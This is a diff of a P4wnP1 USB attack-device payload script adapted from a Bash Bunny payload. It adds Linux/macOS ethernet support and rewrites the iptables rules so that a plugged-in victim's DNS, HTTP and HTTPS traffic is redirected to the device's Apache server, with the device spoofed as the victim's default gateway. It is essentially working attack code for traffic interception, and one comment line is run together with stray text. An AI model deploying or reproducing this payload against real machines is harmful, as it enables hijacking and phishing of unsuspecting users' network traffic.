@@ -18,7 +18,9 @@
 
 #Author: Briskat
 #Based on Bash bunny payload by Sebastian Kinne 'Sebkinne'
+
 #=================================
+USE_ECM=true     # Linux / MacOS ethernet support
 USE_RNDIS=true   # Enables USB Ethernet Gadget
 USE_HID=true     # If you ever want to use ducky scripts with this payload
 ROUTE_SPOOF=true # Makes IP of P4wnP1 the default gateway on the victim
@@ -26,15 +28,24 @@ ROUTE_SPOOF=true # Makes IP of P4wnP1 the default gateway on the victim
 
 function setupNetworking() {
     echo 1 > /proc/sys/net/ipv4/ip_forward
-    iptables -A INPUT -i usb0 -p udp --dport 53 -j ACCEPT
-    iptables -A INPUT -i usb0 -p udp --dport 443 -j DROP
-    iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j DNAT --to-destination 172.16.0.2:80
-    iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j DNAT --to-destination 172.16.0.1:80
-    iptables -t nat -A PREROUTING -i usb0 -p udp --dport 53 -j DNAT --to-destination 172.16.0.1:53
+    iptables -A INPUT -i usb1 -p udp --dport 443 -j DROP
+    iptables -A FORWARD -i usb1 -p udp --dport 53 -j ACCEPT
+    iptables -A FORWARD -i usb1 -p udp --sport 53 -j ACCEPT
+	iptables -A INPUT -i usb0 -p udp --dport 443 -j DROP
+    iptables -A FORWARD -i usb0 -p udp --dport 53 -j ACCEPT
+    iptables -A FORWARD -i usb0 -p udp --sport 53 -j ACCEPT
+    iptables -t nat -A PREROUTING -i usb1 -p tcp --dport 443 -j DNAT --to-destination $IF_IP:80
+    iptables -t nat -A PREROUTING -i usb1 -p tcp --dport 80 -j DNAT --to-destination $IF_IP:80
+    iptables -t nat -A PREROUTING -i usb1 -p udp --dport 53 -j DNAT --to-destination $IF_IP:53
+	iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j DNAT --to-destination $IF_IP:80
+    iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j DNAT --to-destination $IF_IP:80
+    iptables -t nat -A PREROUTING -i usb0 -p udp --dport 53 -j DNAT --to-destination $IF_IP:53
     iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
-service apache2 start # Start apache (must be installed, check out readme for more info)
-setupNetworking       # Calls function written above to redirect all network traffic (needs more work)
-led_blink 3           # blinks led on pi 3 times in a loop
+service apache2 start   # Starts apache (must be installed, check out readme for more info)Turn on webserver
+setupNetworking         # Calls function written above to redirect all network traffic (needs more work)
+led_blink 3             # blinks led on pi 3 times in a loop
+ 
+
 
